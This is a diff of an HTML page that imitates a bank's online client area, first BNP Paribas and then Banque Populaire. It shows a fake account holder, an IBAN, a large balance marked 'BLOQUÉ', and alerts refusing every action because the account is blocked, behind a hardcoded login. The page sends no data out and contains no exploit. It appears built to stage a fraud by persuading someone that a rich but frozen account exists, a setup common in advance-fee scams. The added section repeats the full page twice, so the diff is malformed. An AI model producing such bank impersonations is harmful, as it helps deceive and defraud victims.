@@ -3,159 +3,359 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BNP Paribas - Espace Client</title>
+    <title>Banque Populaire - Espace Particuliers</title>
     <style>
-        body { background-color: #f3f4f6; color: #1e293b; font-family: sans-serif; margin: 0; padding-bottom: 80px; }
-        .hidden { display: none; }
+        body { font-family: Arial, sans-serif; margin: 0; background-color: #f4f4f4; font-size: 12px; color: #333; }
+        .hidden { display: none !important; }
+
+        /* --- PAGE DE CONNEXION --- */
+        #loginPage { background: #005696; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .login-box { background: white; padding: 25px; border-radius: 4px; width: 300px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); border-top: 5px solid #ff7900; }
+        .login-box h2 { color: #005696; margin: 0 0 15px 0; font-size: 18px; text-align: center; }
+        .field { margin-bottom: 15px; }
+        .field label { display: block; margin-bottom: 5px; font-weight: bold; }
+        .field input { width: 92%; padding: 8px; border: 1px solid #ccc; border-radius: 3px; }
+        .btn-submit { background: #ff7900; color: white; border: none; width: 100%; padding: 10px; font-weight: bold; cursor: pointer; border-radius: 3px; }
+
+        /* --- STRUCTURE DU COMPTE --- */
+        .wrapper { width: 1050px; margin: 10px auto; background: white; border: 1px solid #999; }
         
-        /* Connexion & Loader */
-        .login-page { background-color: #041e16; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; text-align: center; }
-        input, select { width: 85%; padding: 15px; margin: 10px 0; border-radius: 8px; border: 1px solid #ddd; font-size: 14px; }
-        .btn-green { background: #00965e; color: white; border: none; padding: 15px 50px; border-radius: 30px; font-weight: bold; cursor: pointer; width: 90%; }
+        /* Header */
+        .header-top { display: flex; justify-content: space-between; padding: 15px; align-items: center; border-bottom: 1px solid #ccc; }
+        .logo-section h1 { color: #005696; margin: 0; font-size: 24px; letter-spacing: -1px; }
+        .logo-section span { color: #ff7900; }
+        .user-panel { border: 1px solid #007c5b; padding: 10px 15px; background: #f9fff9; text-align: right; }
+        .clock { color: #cc0000; font-weight: bold; font-size: 13px; }
 
-        /* Header & Horloge */
-        .header { background: #00965e; color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; font-weight: bold; }
-        .time-box { font-size: 11px; background: rgba(0,0,0,0.2); padding: 5px 10px; border-radius: 15px; }
+        /* Menu Horizontal */
+        .nav-h { background: #007c5b; color: white; display: flex; list-style: none; padding: 0; margin: 0; border-bottom: 2px solid #ff7900; }
+        .nav-h li { padding: 8px 15px; border-right: 1px solid #006349; cursor: pointer; font-size: 11px; font-weight: bold; }
+        .nav-h li:hover { background: #005e45; }
 
-        /* Contenu */
-        .container { padding: 15px; }
-        .card { background: white; border-radius: 15px; padding: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 20px; }
-        .balance-card { background: linear-gradient(135deg, #00965e, #006b43); color: white; text-align: center; }
+        /* Body Layout */
+        .main { display: flex; padding: 15px; min-height: 500px; }
         
-        /* Navigation Basse */
-        .nav-bar { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #e2e8f0; }
-        .nav-item { font-size: 11px; color: #64748b; text-align: center; cursor: pointer; border: none; background: none; flex: 1; }
-        .nav-item.active { color: #00965e; font-weight: bold; }
+        /* Sidebar */
+        .sidebar { width: 210px; flex-shrink: 0; margin-right: 20px; }
+        .menu-cat { background: #000; color: #fff; padding: 6px; font-weight: bold; text-transform: uppercase; font-size: 10px; margin-bottom: 1px; }
+        .menu-items { list-style: none; padding: 0; margin: 0 0 15px 0; }
+        .menu-items li { background: #007c5b; color: white; padding: 7px 10px; border-bottom: 1px solid #fff; cursor: pointer; }
+        .menu-items li:hover { background: #005696; }
 
-        /* Transactions */
-        .transaction-item { border-bottom: 1px solid #f1f5f9; padding: 15px 0; }
-        .details { display: none; background: #f8fafc; padding: 10px; border-radius: 8px; margin-top: 10px; font-size: 13px; }
+        /* Content */
+        .content { flex-grow: 1; }
+        .page-title { font-size: 16px; font-weight: bold; border-bottom: 1px solid #000; margin-bottom: 15px; padding-bottom: 5px; }
+        
+        /* Tableaux */
+        .rib-table { width: 100%; border-collapse: collapse; margin-bottom: 20px; border: 1px solid #ccc; }
+        .rib-table td { padding: 8px; border: 1px solid #eee; }
+        .rib-table td.grey { background: #f2f2f2; font-weight: bold; width: 35%; }
+        .rib-header { background: #e8e8e8; font-weight: bold; padding: 8px; border: 1px solid #ccc; border-bottom: none; }
 
-        /* Profil */
-        .profile-header { text-align: center; padding: 20px 0; }
-        .avatar { width: 80px; height: 80px; background: #00965e; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; margin: 0 auto 10px; }
+        .balance-box { border: 1px solid #ccc; margin-top: 15px; }
+        .balance-head { background: #eee; display: flex; justify-content: space-between; padding: 6px; font-weight: bold; border-bottom: 1px solid #ccc; }
+        .balance-row { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #eee; }
+        
+        .footer-line { background: #007c5b; color: white; text-align: center; padding: 10px; font-size: 10px; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-    <div id="loginPage" class="login-page">
-        <h2 style="color: #00965e;">BNP PARIBAS</h2>
-        <input type="text" id="identifiant" placeholder="Identifiant">
-        <input type="password" id="password" placeholder="Code secret">
-        <button class="btn-green" onclick="connexion()">SE CONNECTER</button>
+    <div id="loginPage">
+        <div class="login-box">
+            <h2>BANQUE POPULAIRE</h2>
+            <div class="field">
+                <label>Identifiant</label>
+                <input type="text" id="username_input" placeholder="alexisduchant">
+            </div>
+            <div class="field">
+                <label>Code secret</label>
+                <input type="password" id="password_input" placeholder="••••••••">
+            </div>
+            <button class="btn-submit" onclick="tenterConnexion()">ACCÉDER À MES COMPTES</button>
+            <p id="error" style="color:red; font-size:11px; display:none; text-align:center; margin-top:10px;">Identifiants invalides.</p>
+        </div>
     </div>
 
     <div id="app" class="hidden">
-        
-        <div class="header">
-            <span id="pageTitle">ACCUEIL</span>
-            <div class="time-box" id="clock">00:00:00</div>
-        </div>
+        <div class="wrapper">
+            <div class="header-top">
+                <div class="logo-section">
+                    <h1>BANQUE <span>POPULAIRE</span></h1>
+                    <div style="font-size:10px; font-weight:bold;">ESPACE CLIENT SÉCURISÉ</div>
+                </div>
+                <div class="user-panel">
+                    Bienvenue, <strong>DUCHANT ALEXIS</strong><br>
+                    Gestionnaire : <span style="color:blue; font-weight:bold;">PATRICK DUBOIS</span><br>
+                    <span class="clock" id="live_clock">00:00:00</span> | <button onclick="location.reload()" style="cursor:pointer; font-size:10px;">Déconnexion</button>
+                </div>
+            </div>
 
-        <div class="container">
-            
-            <div id="section-home">
-                <div class="card balance-card">
-                    <p style="opacity: 0.9; margin: 0;">Solde Total</p>
-                    <h1 style="font-size: 32px; margin: 10px 0;">850 000 FCFA</h1>
-                    <div style="background:#fee2e2; color:#b91c1c; padding:5px 12px; border-radius:20px; font-size:11px; font-weight:bold; display:inline-block;">COMPTE BLOQUÉ</div>
+            <ul class="nav-h">
+                <li>Accueil</li><li>Votre Banque</li><li>Compte cartes</li><li>Bourse</li><li>Rapport fraude</li><li>Immobilier</li><li>Épargne</li><li>Messages</li><li>Contactez-nous</li>
+            </ul>
+
+            <div class="main">
+                <div class="sidebar">
+                    <div class="menu-cat">Information Bancaire</div>
+                    <ul class="menu-items">
+                        <li onclick="msg()">Compte Courant</li>
+                        <li onclick="msg()">Compte Épargne</li>
+                        <li onclick="msg()">Mes Cartes</li>
+                        <li onclick="msg()">Prêt bancaire</li>
+                    </ul>
+                    <div class="menu-cat">Gestion de Virement</div>
+                    <ul class="menu-items">
+                        <li onclick="msg()">Suivre vos virements</li>
+                        <li onclick="msg()">Ajouter un bénéficiaire</li>
+                        <li onclick="msg()">Liste des bénéficiaires</li>
+                        <li onclick="msg()">Effectuer un virement</li>
+                    </ul>
                 </div>
 
-                <div class="card">
-                    <h4 style="margin: 0 0 15px 0; color: #00965e;">Dernières Opérations</h4>
-                    <div class="transaction-item" onclick="toggleDetails('d1')">
-                        <div style="display:flex; justify-content:space-between;">
-                            <div><strong>Virement Reçu</strong><br><small>Hier, 14:20</small></div>
-                            <div style="color:#10b981; font-weight:bold;">+ 200 000 F</div>
+                <div class="content">
+                    <div class="page-title">COMPTE COURANT</div>
+                    <div style="margin-bottom:10px;"><strong>DUCHANT ALEXIS - 1087624312</strong></div>
+                    
+                    <div class="rib-header">Détails - Relevé d'identité Bancaire (RIB)</div>
+                    <table class="rib-table">
+                        <tr><td class="grey">Titulaire du compte :</td><td>DUCHANT ALEXIS</td></tr>
+                        <tr><td class="grey">Numéro du compte bancaire :</td><td>14WY82420306</td></tr>
+                        <tr><td class="grey">IBAN :</td><td>BE78 9390 6721 2130 84</td></tr>
+                        <tr><td class="grey">Code banque :</td><td>40124</td></tr>
+                        <tr><td class="grey">Code Agence :</td><td>20308</td></tr>
+                        <tr><td class="grey">Code SWIFT :</td><td>CRAGFRPPXXX</td></tr>
+                        <tr><td class="grey">Clé RIB :</td><td>17</td></tr>
+                        <tr><td class="grey">Domiciliation des fonds :</td><td>BANQUE POPULAIRE BELGIQUE</td></tr>
+                        <tr><td class="grey">Statut du compte :</td><td style="color:red; font-weight:bold;">BLOQUÉ</td></tr>
+                    </table>
+
+                    <div style="font-weight:bold; margin-top:20px;">Le relevé de votre situation financière</div>
+                    <div class="balance-box">
+                        <div class="balance-head"><span>COMPTE COURANT</span><span>BALANCE</span></div>
+                        <div class="balance-row">
+                            <span style="color:blue; font-weight:bold;">DUCHANT ALEXIS</span>
+                            <span style="font-weight:bold;">532 048,00 €</span>
                         </div>
-                        <div id="d1" class="details">Motif : Soutien familial<br>Émetteur : I. Zongo Senior</div>
+                        <div class="balance-row" style="background:#f9f9f9;">
+                            <span>Solde au <span id="current_date">02/04/2026</span></span>
+                            <span style="font-size:14px; font-weight:bold;">532 048,00 €</span>
+                        </div>
                     </div>
                 </div>
             </div>
 
-            <div id="section-transfer" class="hidden">
-                <div class="card">
-                    <h4 style="color: #00965e; margin-top: 0;">Nouveau Virement</h4>
-                    <label>Bénéficiaire (Nom & Prénom)</label>
-                    <input type="text" placeholder="Ex: Jean Kouassi">
-                    <label>IBAN du destinataire</label>
-                    <input type="text" placeholder="FR76 0000 0000...">
-                    <label>Montant (FCFA)</label>
-                    <input type="number" placeholder="0.00">
-                    <button class="btn-green" style="margin-top: 10px;" onclick="alert('Action impossible : Votre compte est actuellement bloqué. Veuillez contacter un conseiller.')">VALIDER LE TRANSFERT</button>
-                </div>
+            <div class="footer-line">
+                Banque mondiale &copy; 2026 | Sécurité garantie | Protection des données
             </div>
-
-            <div id="section-profile" class="hidden">
-                <div class="card">
-                    <div class="profile-header">
-                        <div class="avatar">ZI</div>
-                        <h3>ZONGO Ibrahim</h3>
-                        <p style="color:#64748b">Client Particulier</p>
-                    </div>
-                    <hr style="border:0; border-top:1px solid #eee;">
-                    <p><strong>Email :</strong> ibrahim***@gmail.com</p>
-                    <p><strong>Téléphone :</strong> +226 ** ** ** **</p>
-                    <p><strong>Agence :</strong> Ouagadougou Centre</p>
-                    <button class="btn-green" style="background:#334155;" onclick="location.reload()">DÉCONNEXION</button>
-                </div>
-            </div>
-
-        </div>
-
-        <div class="nav-bar">
-            <button class="nav-item active" id="btn-home" onclick="showSection('home')">🏠<br>Accueil</button>
-            <button class="nav-item" id="btn-transfer" onclick="showSection('transfer')">💸<br>Virements</button>
-            <button class="nav-item" id="btn-profile" onclick="showSection('profile')">👤<br>Profil</button>
         </div>
     </div>
 
     <script>
-        // 1. GESTION DE L'HORLOGE
-        function updateClock() {
-            const now = new Date();
-            const timeString = now.toLocaleTimeString('fr-FR');
-            const dateString = now.toLocaleDateString('fr-FR');
-            document.getElementById('clock').innerHTML = dateString + " | " + timeString;
-        }
-        setInterval(updateClock, 1000);
-        updateClock();
+        function tenterConnexion() {
+            const u = document.getElementById('username_input').value;
+            const p = document.getElementById('password_input').value;
 
-        // 2. CONNEXION
-        function connexion() {
-            const id = document.getElementById('identifiant').value;
-            const mdp = document.getElementById('password').value;
-            if (id === "admin" && mdp === "2026") {
+            if(u === "alexisduchant" && p === "beauxyeux") {
                 document.getElementById('loginPage').classList.add('hidden');
                 document.getElementById('app').classList.remove('hidden');
+                initApp();
+            } else {
+                document.getElementById('error').style.display = "block";
             }
         }
 
-        // 3. NAVIGATION ENTRE SECTIONS
-        function showSection(sectionId) {
-            // Cacher toutes les sections
-            document.getElementById('section-home').classList.add('hidden');
-            document.getElementById('section-transfer').classList.add('hidden');
-            document.getElementById('section-profile').classList.add('hidden');
-            
-            // Retirer la classe 'active' des boutons
-            document.getElementById('btn-home').classList.remove('active');
-            document.getElementById('btn-transfer').classList.remove('active');
-            document.getElementById('btn-profile').classList.remove('active');
-
-            // Afficher la section demandée
-            document.getElementById('section-' + sectionId).classList.remove('hidden');
-            document.getElementById('btn-' + sectionId).classList.add('active');
-            
-            // Changer le titre du Header
-            const titles = { 'home': 'ACCUEIL', 'transfer': 'VIREMENT', 'profile': 'MON PROFIL' };
-            document.getElementById('pageTitle').innerText = titles[sectionId];
+        function initApp() {
+            setInterval(() => {
+                const d = new Date();
+                document.getElementById('live_clock').innerText = d.toLocaleTimeString('fr-FR');
+                document.getElementById('current_date').innerText = d.toLocaleDateString('fr-FR');
+            }, 1000);
         }
 
-        // 4. ACCORDÉON TRANSACTIONS
-        function toggleDetails(id) {
-            const el = document.getElementById(id);
-            el.style.display = (el.style.display === 'block') ? 'none' : 'block';
+        function msg() {
+            alert("Action impossible : Vous ne pouvez pas effectuer cette démarche à défaut du compte bloqué.");
+        }
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banque Populaire - Espace Particuliers</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; background-color: #f4f4f4; font-size: 12px; color: #333; }
+        .hidden { display: none !important; }
+
+        /* --- PAGE DE CONNEXION --- */
+        #loginPage { background: #005696; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .login-box { background: white; padding: 25px; border-radius: 4px; width: 300px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); border-top: 5px solid #ff7900; }
+        .login-box h2 { color: #005696; margin: 0 0 15px 0; font-size: 18px; text-align: center; }
+        .field { margin-bottom: 15px; }
+        .field label { display: block; margin-bottom: 5px; font-weight: bold; }
+        .field input { width: 92%; padding: 8px; border: 1px solid #ccc; border-radius: 3px; }
+        .btn-submit { background: #ff7900; color: white; border: none; width: 100%; padding: 10px; font-weight: bold; cursor: pointer; border-radius: 3px; }
+
+        /* --- STRUCTURE DU COMPTE --- */
+        .wrapper { width: 1050px; margin: 10px auto; background: white; border: 1px solid #999; }
+        
+        /* Header */
+        .header-top { display: flex; justify-content: space-between; padding: 15px; align-items: center; border-bottom: 1px solid #ccc; }
+        .logo-section h1 { color: #005696; margin: 0; font-size: 24px; letter-spacing: -1px; }
+        .logo-section span { color: #ff7900; }
+        .user-panel { border: 1px solid #007c5b; padding: 10px 15px; background: #f9fff9; text-align: right; }
+        .clock { color: #cc0000; font-weight: bold; font-size: 13px; }
+
+        /* Menu Horizontal */
+        .nav-h { background: #007c5b; color: white; display: flex; list-style: none; padding: 0; margin: 0; border-bottom: 2px solid #ff7900; }
+        .nav-h li { padding: 8px 15px; border-right: 1px solid #006349; cursor: pointer; font-size: 11px; font-weight: bold; }
+        .nav-h li:hover { background: #005e45; }
+
+        /* Body Layout */
+        .main { display: flex; padding: 15px; min-height: 500px; }
+        
+        /* Sidebar */
+        .sidebar { width: 210px; flex-shrink: 0; margin-right: 20px; }
+        .menu-cat { background: #000; color: #fff; padding: 6px; font-weight: bold; text-transform: uppercase; font-size: 10px; margin-bottom: 1px; }
+        .menu-items { list-style: none; padding: 0; margin: 0 0 15px 0; }
+        .menu-items li { background: #007c5b; color: white; padding: 7px 10px; border-bottom: 1px solid #fff; cursor: pointer; }
+        .menu-items li:hover { background: #005696; }
+
+        /* Content */
+        .content { flex-grow: 1; }
+        .page-title { font-size: 16px; font-weight: bold; border-bottom: 1px solid #000; margin-bottom: 15px; padding-bottom: 5px; }
+        
+        /* Tableaux */
+        .rib-table { width: 100%; border-collapse: collapse; margin-bottom: 20px; border: 1px solid #ccc; }
+        .rib-table td { padding: 8px; border: 1px solid #eee; }
+        .rib-table td.grey { background: #f2f2f2; font-weight: bold; width: 35%; }
+        .rib-header { background: #e8e8e8; font-weight: bold; padding: 8px; border: 1px solid #ccc; border-bottom: none; }
+
+        .balance-box { border: 1px solid #ccc; margin-top: 15px; }
+        .balance-head { background: #eee; display: flex; justify-content: space-between; padding: 6px; font-weight: bold; border-bottom: 1px solid #ccc; }
+        .balance-row { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #eee; }
+        
+        .footer-line { background: #007c5b; color: white; text-align: center; padding: 10px; font-size: 10px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <div id="loginPage">
+        <div class="login-box">
+            <h2>BANQUE POPULAIRE</h2>
+            <div class="field">
+                <label>Identifiant</label>
+                <input type="text" id="username_input" placeholder="alexisduchant">
+            </div>
+            <div class="field">
+                <label>Code secret</label>
+                <input type="password" id="password_input" placeholder="••••••••">
+            </div>
+            <button class="btn-submit" onclick="tenterConnexion()">ACCÉDER À MES COMPTES</button>
+            <p id="error" style="color:red; font-size:11px; display:none; text-align:center; margin-top:10px;">Identifiants invalides.</p>
+        </div>
+    </div>
+
+    <div id="app" class="hidden">
+        <div class="wrapper">
+            <div class="header-top">
+                <div class="logo-section">
+                    <h1>BANQUE <span>POPULAIRE</span></h1>
+                    <div style="font-size:10px; font-weight:bold;">ESPACE CLIENT SÉCURISÉ</div>
+                </div>
+                <div class="user-panel">
+                    Bienvenue, <strong>DUCHANT ALEXIS</strong><br>
+                    Gestionnaire : <span style="color:blue; font-weight:bold;">PATRICK DUBOIS</span><br>
+                    <span class="clock" id="live_clock">00:00:00</span> | <button onclick="location.reload()" style="cursor:pointer; font-size:10px;">Déconnexion</button>
+                </div>
+            </div>
+
+            <ul class="nav-h">
+                <li>Accueil</li><li>Votre Banque</li><li>Compte cartes</li><li>Bourse</li><li>Rapport fraude</li><li>Immobilier</li><li>Épargne</li><li>Messages</li><li>Contactez-nous</li>
+            </ul>
+
+            <div class="main">
+                <div class="sidebar">
+                    <div class="menu-cat">Information Bancaire</div>
+                    <ul class="menu-items">
+                        <li onclick="msg()">Compte Courant</li>
+                        <li onclick="msg()">Compte Épargne</li>
+                        <li onclick="msg()">Mes Cartes</li>
+                        <li onclick="msg()">Prêt bancaire</li>
+                    </ul>
+                    <div class="menu-cat">Gestion de Virement</div>
+                    <ul class="menu-items">
+                        <li onclick="msg()">Suivre vos virements</li>
+                        <li onclick="msg()">Ajouter un bénéficiaire</li>
+                        <li onclick="msg()">Liste des bénéficiaires</li>
+                        <li onclick="msg()">Effectuer un virement</li>
+                    </ul>
+                </div>
+
+                <div class="content">
+                    <div class="page-title">COMPTE COURANT</div>
+                    <div style="margin-bottom:10px;"><strong>DUCHANT ALEXIS - 1087624312</strong></div>
+                    
+                    <div class="rib-header">Détails - Relevé d'identité Bancaire (RIB)</div>
+                    <table class="rib-table">
+                        <tr><td class="grey">Titulaire du compte :</td><td>DUCHANT ALEXIS</td></tr>
+                        <tr><td class="grey">Numéro du compte bancaire :</td><td>14WY82420306</td></tr>
+                        <tr><td class="grey">IBAN :</td><td>BE78 9390 6721 2130 84</td></tr>
+                        <tr><td class="grey">Code banque :</td><td>40124</td></tr>
+                        <tr><td class="grey">Code Agence :</td><td>20308</td></tr>
+                        <tr><td class="grey">Code SWIFT :</td><td>CRAGFRPPXXX</td></tr>
+                        <tr><td class="grey">Clé RIB :</td><td>17</td></tr>
+                        <tr><td class="grey">Domiciliation des fonds :</td><td>BANQUE POPULAIRE BELGIQUE</td></tr>
+                        <tr><td class="grey">Statut du compte :</td><td style="color:red; font-weight:bold;">BLOQUÉ</td></tr>
+                    </table>
+
+                    <div style="font-weight:bold; margin-top:20px;">Le relevé de votre situation financière</div>
+                    <div class="balance-box">
+                        <div class="balance-head"><span>COMPTE COURANT</span><span>BALANCE</span></div>
+                        <div class="balance-row">
+                            <span style="color:blue; font-weight:bold;">DUCHANT ALEXIS</span>
+                            <span style="font-weight:bold;">532 048,00 €</span>
+                        </div>
+                        <div class="balance-row" style="background:#f9f9f9;">
+                            <span>Solde au <span id="current_date">02/04/2026</span></span>
+                            <span style="font-size:14px; font-weight:bold;">532 048,00 €</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="footer-line">
+                Banque mondiale &copy; 2026 | Sécurité garantie | Protection des données
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function tenterConnexion() {
+            const u = document.getElementById('username_input').value;
+            const p = document.getElementById('password_input').value;
+
+            if(u === "alexisduchant" && p === "beauxyeux") {
+                document.getElementById('loginPage').classList.add('hidden');
+                document.getElementById('app').classList.remove('hidden');
+                initApp();
+            } else {
+                document.getElementById('error').style.display = "block";
+            }
+        }
+
+        function initApp() {
+            setInterval(() => {
+                const d = new Date();
+                document.getElementById('live_clock').innerText = d.toLocaleTimeString('fr-FR');
+                document.getElementById('current_date').innerText = d.toLocaleDateString('fr-FR');
+            }, 1000);
+        }
+
+        function msg() {
+            alert("Action impossible : Vous ne pouvez pas effectuer cette démarche à défaut du compte bloqué.");
         }
     </script>
 </body>
